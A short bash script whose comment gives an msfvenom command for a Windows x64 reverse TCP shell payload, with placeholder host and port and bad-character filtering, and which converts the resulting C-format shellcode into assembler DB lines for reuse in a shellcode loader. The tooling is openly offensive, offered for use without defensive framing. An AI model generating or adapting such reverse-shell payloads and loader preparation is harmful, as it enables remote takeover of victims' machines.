#! /bin/bash
#
#
# Convert a shellcode gottent by this cmd:
# msfvenom -p windows/x64/shell_reverse_tcp RHOST=XX.XX.XX.XX LPORT=XXXX -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c > shell.txt
# To re-use this with a shellcode loader :)

cat shell.txt | cut -d"\"" -f2 | tr " \n" " " | sed 's/ //g' | tr "\\" "h" | tr "x" "," | sed 's/^h,//; s/$/h/' | sed 's/,\([a-zA-Z]\)/,0\1/g' | tr '[:lower:]' '[:upper:]' |  awk 'BEGIN{FS=OFS=","} {for (i=1; i<=NF; i++) {printf "%s%s", $i, (i%8==0 && i<NF ? "\n" : OFS)}}'| sed 's/^/DB /' | sed  's/,$//'

